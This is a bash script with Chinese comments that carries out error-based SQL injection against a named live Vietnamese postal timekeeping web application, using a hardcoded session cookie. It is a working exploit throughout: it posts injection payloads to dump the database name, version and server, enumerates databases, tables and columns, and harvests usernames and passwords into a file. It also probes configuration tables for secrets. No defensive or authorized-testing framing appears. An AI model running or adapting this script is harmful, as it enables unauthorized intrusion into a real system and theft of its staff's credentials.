#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 SQL注入 - 数据提取"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

get_viewstate() {
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
}

extract_data() {
    local payload=$1
    local desc=$2
    
    echo "  [+] 提取: $desc"
    
    get_viewstate
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${payload}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" 2>&1 | \
        grep -oE "Conversion failed.*'[^']+'" | \
        sed "s/Conversion failed when converting the nvarchar value '//" | \
        sed "s/' to data type int.//" | head -1
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[1] 数据库基本信息"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
DB_NAME=$(extract_data "11' AND 1=CAST(DB_NAME() AS INT)--" "数据库名")
echo "    数据库名: $DB_NAME"

echo ""
DB_USER=$(extract_data "11' AND 1=CAST(USER_NAME() AS INT)--" "当前用户")
echo "    当前用户: $DB_USER"

echo ""
DB_VERSION=$(extract_data "11' AND 1=CAST(@@VERSION AS INT)--" "SQL Server版本")
echo "    版本: $DB_VERSION"

echo ""
SERVER_NAME=$(extract_data "11' AND 1=CAST(@@SERVERNAME AS INT)--" "服务器名")
echo "    服务器: $SERVER_NAME"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[2] 枚举所有数据库"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "  数据库列表:"
for i in {0..10}; do
    db=$(extract_data "11' AND 1=CAST((SELECT name FROM sys.databases ORDER BY name OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY) AS INT)--" "数据库 #$i")
    if [ -n "$db" ]; then
        echo "    [$i] $db"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[3] 枚举当前数据库的表"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "  表列表:"
for i in {0..20}; do
    table=$(extract_data "11' AND 1=CAST((SELECT name FROM sys.tables ORDER BY name OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY) AS INT)--" "表 #$i")
    if [ -n "$table" ]; then
        echo "    [$i] $table"
        
        # 如果是用户相关的表，记录下来
        if echo "$table" | grep -qiE "user|account|login|admin|member|employee|staff"; then
            echo "$table" >> important_tables.txt
        fi
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[4] 提取重要表的列名"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "important_tables.txt" ]; then
    cat important_tables.txt | sort -u | while read table; do
        echo ""
        echo "  表: $table"
        echo "  列:"
        
        for i in {0..10}; do
            column=$(extract_data "11' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='$table' ORDER BY column_name OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY) AS INT)--" "列 #$i")
            if [ -n "$column" ]; then
                echo "    - $column"
            fi
        done
    done
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[5] 提取用户凭证"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 尝试常见的用户表和列名
USER_TABLES=(
    "users:username:password"
    "user:user_name:user_pass"
    "account:account_name:account_password"
    "admin:admin_name:admin_pass"
    "member:member_name:member_password"
    "employee:emp_name:emp_password"
    "dmnhanvien:tendangnhap:matkhau"
    "dmnhanvien:madv:tennv"
    "tbluser:username:password"
    "tbluser:userid:userpass"
)

for combo in "${USER_TABLES[@]}"; do
    IFS=':' read table user_col pass_col <<< "$combo"
    
    echo ""
    echo "  尝试: $table.$user_col / $table.$pass_col"
    
    # 提取前5个用户
    for i in {0..4}; do
        user=$(extract_data "11' AND 1=CAST((SELECT $user_col FROM $table ORDER BY $user_col OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY) AS INT)--" "用户 #$i")
        if [ -n "$user" ]; then
            echo "    用户: $user"
            
            # 尝试获取密码
            pass=$(extract_data "11' AND 1=CAST((SELECT $pass_col FROM $table WHERE $user_col='$user') AS INT)--" "密码")
            if [ -n "$pass" ]; then
                echo "      密码: $pass"
                echo "$user:$pass" >> extracted_creds.txt
            fi
        fi
    done
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[6] 寻找web.config连接字符串"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 尝试读取配置表
CONFIG_TABLES=(
    "config"
    "configuration"
    "settings"
    "system_config"
    "app_settings"
)

for table in "${CONFIG_TABLES[@]}"; do
    echo ""
    echo "  检查表: $table"
    
    for i in {0..10}; do
        config=$(extract_data "11' AND 1=CAST((SELECT TOP 1 * FROM $table) AS INT)--" "配置")
        if [ -n "$config" ]; then
            echo "    配置: $config"
        fi
    done
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 数据提取完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 提取的凭证:"
if [ -f "extracted_creds.txt" ]; then
    cat extracted_creds.txt | sort -u
else
    echo "  （未找到）"
fi
